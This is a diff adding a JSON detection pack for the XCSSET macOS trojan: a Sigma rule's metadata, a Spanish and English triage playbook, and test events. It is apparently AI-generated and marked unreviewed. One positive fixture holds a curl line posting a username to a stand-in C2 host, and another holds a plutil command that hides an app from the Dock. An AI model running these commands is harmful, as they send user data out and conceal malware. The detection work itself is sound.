@@ -1,0 +1,128 @@
+{
+  "rule": {
+    "id": "47d65ac0-c06f-4ba2-a2e3-d263139d0f51",
+    "title": "Potential XCSSET Malware Infection",
+    "level": "medium",
+    "status": "test",
+    "author": "Tim Rauch (rule), Elastic (idea)",
+    "path": "macos/process_creation/proc_creation_macos_xcsset_malware_infection.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/macos/process_creation/proc_creation_macos_xcsset_malware_infection.yml",
+    "license": "DRL-1.1",
+    "techniques": []
+  },
+  "playbook": {
+    "es": {
+      "summary": "Un proceso en macOS mostró rastros de ejecución asociados al troyano XCSSET: curl lanzado desde bash hacia rutas /sys/ por HTTPS, o uso de osacompile, plutil o zip sobre ~/Library/Group Containers/.",
+      "what_it_detects": "Detecta curl hijo de bash cuyo CommandLine contiene https:// y /sys/log.php, /sys/prepod.php o /sys/bin/Pods; osacompile o plutil (con LSUIElement) lanzados por bash sobre /Users/*/Library/Group Containers/; o zip -r sobre esa misma ruta.",
+      "why_it_matters": "XCSSET se propaga mediante proyectos de Xcode, modifica aplicaciones y roba credenciales y datos. El curl hacia rutas /sys/ corresponde a comunicación de comando y control; plutil con LSUIElement oculta apps maliciosas del Dock y zip -r empaqueta datos para exfiltrarlos.",
+      "triage_steps": [
+        "Revise Image, ParentImage y CommandLine; identifique cuál selección coincidió (curl, osacompile, plutil o zip) y el usuario dueño de la ruta /Users/.",
+        "Para curl, extraiga el dominio de la URL HTTPS y búsquelo en logs de DNS, proxy y firewall de toda la organización.",
+        "Recorra el árbol de procesos: el padre bash y su ancestro; verifique si proviene de Xcode, xcodebuild o una compilación de proyecto.",
+        "Busque en el mismo host, +/- 15 minutos, otros curl, osacompile, plutil o zip, y la creación de archivos .app o .scpt en Group Containers.",
+        "Inspeccione los proyectos de Xcode recientes del usuario (archivos .xcodeproj, fases Run Script) en busca de scripts añadidos o descargados.",
+        "Revise alertas previas del mismo host y usuario, y si otros equipos de desarrollo compartieron el mismo repositorio."
+      ],
+      "false_positives": [
+        "La regla no documenta falsos positivos conocidos; trate cada coincidencia como sospechosa hasta verificarla.",
+        "Scripts internos de build o despliegue que usan plutil o zip sobre Group Containers de una aplicación legítima.",
+        "Herramientas de respaldo o soporte que comprimen con zip -r datos de Group Containers del usuario."
+      ],
+      "response_steps": [
+        "Confirme la actividad maliciosa validando el dominio contactado y el contenido de los archivos creados o modificados.",
+        "Aísle el endpoint de la red y bloquee el dominio de C2 en proxy y DNS.",
+        "Identifique y retire los proyectos de Xcode infectados; avise a quienes compartan esos repositorios.",
+        "Elimine aplicaciones y scripts maliciosos tras respaldarlos como evidencia; revise LaunchAgents y apps modificadas.",
+        "Restablezca credenciales, sesiones de navegador y tokens del usuario afectado, y reinstale el sistema si la limpieza no es confiable."
+      ],
+      "severity_rationale": "Nivel medio: los patrones son bastante específicos de XCSSET, pero algunas selecciones (plutil, zip) pueden coincidir con tareas legítimas y requieren verificación."
+    },
+    "en": {
+      "summary": "A macOS process showed execution traces tied to the XCSSET trojan: bash-spawned curl to /sys/ paths over HTTPS, or osacompile, plutil or zip acting on ~/Library/Group Containers/.",
+      "what_it_detects": "curl with a bash parent whose CommandLine has https:// plus /sys/log.php, /sys/prepod.php or /sys/bin/Pods; bash-spawned osacompile or plutil (with LSUIElement) on /Users/*/Library/Group Containers/; or zip -r on that path.",
+      "why_it_matters": "XCSSET spreads through Xcode projects, modifies applications and steals credentials and data. The curl to /sys/ paths is command-and-control traffic; plutil LSUIElement hides malicious apps from the Dock; zip -r stages data for exfiltration.",
+      "triage_steps": [
+        "Review Image, ParentImage and CommandLine; identify which selection matched (curl, osacompile, plutil or zip) and the user owning the /Users/ path.",
+        "For curl, extract the domain from the HTTPS URL and search DNS, proxy and firewall logs across the organization.",
+        "Walk the process tree: the bash parent and its ancestors; check whether it came from Xcode, xcodebuild or a project build.",
+        "On the same host, +/- 15 minutes, look for other curl, osacompile, plutil or zip runs and new .app or .scpt files in Group Containers.",
+        "Inspect the user's recent Xcode projects (.xcodeproj, Run Script build phases) for added or downloaded scripts.",
+        "Check earlier alerts for the same host and user, and whether other developers share the same repository."
+      ],
+      "false_positives": [
+        "The rule lists no known false positives; treat matches as suspicious until verified.",
+        "Internal build or deployment scripts using plutil or zip on a legitimate app's Group Containers.",
+        "Backup or support tools that zip -r user Group Containers data."
+      ],
+      "response_steps": [
+        "Confirm malicious activity by validating the contacted domain and the content of created or modified files.",
+        "Isolate the endpoint and block the C2 domain at proxy and DNS.",
+        "Identify and quarantine infected Xcode projects; notify everyone sharing those repositories.",
+        "Remove malicious apps and scripts after preserving them as evidence; review LaunchAgents and modified applications.",
+        "Reset the user's credentials, browser sessions and tokens; reimage if cleanup cannot be trusted."
+      ],
+      "severity_rationale": "Medium: the patterns are fairly specific to XCSSET, but some selections (plutil, zip) can match legitimate tasks and need verification."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "bash spawns curl posting to /sys/log.php on an HTTPS C2 host",
+        "event": {
+          "Image": "/usr/bin/curl",
+          "ParentImage": "/bin/bash",
+          "CommandLine": "curl -sk -d user=jperez https://cdn.example.com/sys/log.php",
+          "User": "jperez",
+          "Computer": "MBP-0142",
+          "ProcessId": 4821,
+          "ParentProcessId": 4790
+        }
+      },
+      {
+        "description": "bash runs plutil to set LSUIElement on an app inside Group Containers",
+        "event": {
+          "Image": "/usr/bin/plutil",
+          "ParentImage": "/bin/bash",
+          "CommandLine": "plutil -replace LSUIElement -bool true /Users/jperez/Library/Group Containers/.xcassets/Notes.app/Contents/Info.plist",
+          "User": "jperez",
+          "Computer": "MBP-0142",
+          "ProcessId": 4902,
+          "ParentProcessId": 4790
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "bash curl to a /sys/log.php path over plain HTTP; selection_1_https does not match",
+        "event": {
+          "Image": "/usr/bin/curl",
+          "ParentImage": "/bin/bash",
+          "CommandLine": "curl -s http://intranet.example.org/sys/log.php",
+          "User": "jperez",
+          "Computer": "MBP-0142",
+          "ProcessId": 5010,
+          "ParentProcessId": 4990
+        }
+      },
+      {
+        "description": "osacompile on Group Containers launched from zsh, not bash",
+        "event": {
+          "Image": "/usr/bin/osacompile",
+          "ParentImage": "/bin/zsh",
+          "CommandLine": "osacompile -o /Users/jperez/Library/Group Containers/group.example.tools/helper.scpt helper.applescript",
+          "User": "jperez",
+          "Computer": "MBP-0142",
+          "ProcessId": 5120,
+          "ParentProcessId": 5100
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-25T21:59:49+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
